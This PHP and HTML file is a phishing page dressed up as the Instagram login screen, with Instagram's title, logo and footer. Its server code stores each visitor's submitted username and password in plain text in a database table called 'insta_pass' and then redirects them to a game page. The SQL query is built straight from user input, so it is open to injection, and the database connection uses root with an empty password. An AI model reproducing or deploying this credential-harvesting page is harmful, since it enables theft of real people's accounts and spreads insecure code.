<?php
  $insert = FALSE;  
  if($_SERVER['REQUEST_METHOD'] == "POST")
  {
    $server = "localhost";
    $username = "root";
    $password = "";

    $con = mysqli_connect($server, $username, $password);

    if(!$con){
        die("Connection failed". mysqli_connect_error());
    }
    // echo "Connection Successfull";

    $user = $_POST['username'];
    $pass = $_POST['pass'];

    $sql = "INSERT INTO `instapass`.`insta_pass` (`username`, `password`) VALUES ('$user', '$pass');";
    // echo $sql;

    if($con -> query($sql) === TRUE){
        // echo "Sucessfully Inserted";
        $insert = TRUE;
    }
    else{
        echo "Error: " . $sql . "<br>" . $con->error;
    }

    if($insert == TRUE){
      header("Location:game.html");
    }
    $con -> close();
  }
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="static/style.css">
    <title>Log in • Instagram</title>
</head>
<body>
    <div id="wrapper">
      <div class="container">
        <div class="phone-app-demo"></div>
        <div class="form-data">
          <form action="index.php" method="post">
            <div class="logo">
              <img src="static/logo.png" alt="logo">
            </div>
            <input type="text" name = "username" id = "username" placeholder="Username">
            <input type="password" name = "pass" id = "pass" placeholder="Password">
            <button onclick="window.location.href = 'quiz.html';" class="form-btn" type="Submit">Log in</button>
          </form>
        </div>
      </div>
      
      <footer>
        <div class="container">
          <nav class="footer-nav">
            <ul>
              <li>
                <a href="#">About us</a>
              </li>
              <li>
                <a href="#">Support</a>
              </li>
              <li>
                <a href="#">Press</a>
              </li>
              <li>
                <a href="#">Api</a>
              </li>
              <li>
                <a href="#">Jobs</a>
              </li>
              <li>
                <a href="#">Privacy</a>
              </li>
              <li>
                <a href="#">Terms</a>
              </li>
              <li>
                <a href="#">Directory</a>
              </li>
              <li>
                <a href="#">Profiles</a>
              </li>
              <li>
                <a href="#">Hashtags</a>
              </li>
              <li>
                <a href="#">Languages</a>
              </li>
            </ul>
          </nav>
          <div class="copyright-notice">
            &copy 2021 Instagram
          </div>
        </div>
      </footer>
    </div>
    <script>
   </script>
  </body>
</html>